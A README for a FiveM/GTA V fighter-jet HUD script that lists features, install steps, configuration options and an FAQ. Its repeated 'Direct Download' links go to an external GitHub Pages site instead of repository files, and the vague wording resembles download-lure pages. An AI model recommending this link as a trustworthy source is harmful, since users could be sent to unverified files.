# Solived Fighter Jet HUD v2 - Game Script Utility 2026

> Fighter jet-style HUD for FiveM and GTA V aircraft, created to swap out the default display for cockpit readouts, targeting cues, and live flight telemetry.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owen-cole28/solived-aircraft-hud-script?style=flat-square)](https://github.com/owen-cole28/solived-aircraft-hud-script)

---

<p align="center">
  <a href="https://owen-cole28.github.io/solived-aircraft-hud-script/">
    <img src="https://img.shields.io/badge/Download-Solived%20Fighter%20Jet%20HUD%20Script-brightgreen?style=for-the-badge" alt="Download Solived Fighter Jet HUD Script">
  </a>
</p>

> **[Direct Download - Solived Fighter Jet HUD](https://owen-cole28.github.io/solived-aircraft-hud-script/)**

---

[Download Latest Build](https://owen-cole28.github.io/solived-aircraft-hud-script/)

---

## What It Does

Solived Fighter Jet HUD v2 is a self-contained FiveM resource made for GTA V aircraft gameplay. It delivers a fighter-jet inspired interface with cockpit-like readouts that highlight important flight and combat information while you are airborne.

Rather than acting as a broad replacement for the entire game UI, this script concentrates on useful in-vehicle feedback. It combines telemetry, targeting prompts, warning-style notifications, and vehicle-themed presentation with synthesized cockpit audio to create a more specialized HUD for aircraft use.

---

## Features

- Fighter jet HUD built specifically for aircraft-focused FiveM and GTA V sessions
- Ongoing flight telemetry for cockpit-style status output
- Weapon reticles and annunciator indicators for airborne combat feedback
- Lock state and target range readouts
- RWR-style warning alerts for situational awareness
- Synthesized cockpit sound cues
- Vehicle-specific visual themes for different aircraft presentations
- Standalone resource layout for simple deployment

---

## Installation

1. Download the latest build using the link above.
2. Place the resource folder in your FiveM resources directory.
3. Make sure the folder name matches the packaged resource, such as `solived-fighter-jet-hud-script-v2`.
4. Add the resource to your server configuration and start it like any other FiveM resource.

Example server entry:

`ensure solived-fighter-jet-hud-script-v2`

If the package includes optional HTML or UI assets, preserve the complete folder structure so the HUD can load its cockpit interface properly.

---

## Configuration

Common script settings may be available through the resource files or configuration assets.

| Option | Purpose |
| --- | --- |
| HUD theme | Selects the visual style for a specific aircraft or cockpit layout |
| Telemetry display | Controls which flight values are shown on screen |
| Targeting cues | Enables or disables lock and distance indicators |
| Warning alerts | Toggles RWR-style alert behavior |
| Cockpit audio | Turns synthesized audio cues on or off |
| Resource start mode | Lets the HUD load automatically with the server |

If your build includes editable config values, set them before launching the resource to avoid needing runtime reloads.

---

## Compatibility Notes

- Designed for FiveM
- Intended for GTA V aircraft and fighter jet gameplay
- Best suited to vehicles that benefit from cockpit-style HUD information
- Some UI elements may vary depending on the aircraft model or server setup
- If another HUD resource is already controlling aircraft overlays, you may need to adjust load order or disable conflicting display modules

---

## FAQ

### How do I install it?
Download the build, copy the resource into your FiveM resources folder, and add an `ensure` line to your server config.

### Can I customize the look?
Yes. The resource is centered on themed cockpit presentation, so visual and audio elements may be adjustable depending on the included files.

### Does it work outside aircraft?
It is meant for fighter jet and aircraft use, so behavior outside that context may be limited or not relevant.

### What should I do after updating?
Swap in the newer resource files, then restart the resource or server so the updated HUD assets load.

### Where are the settings stored?
Any editable settings are usually kept in the resource files alongside the script and UI assets.

### Is it compatible with every FiveM server?
Not always. Compatibility can depend on your server framework, aircraft setup, and any other HUD resources already running.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
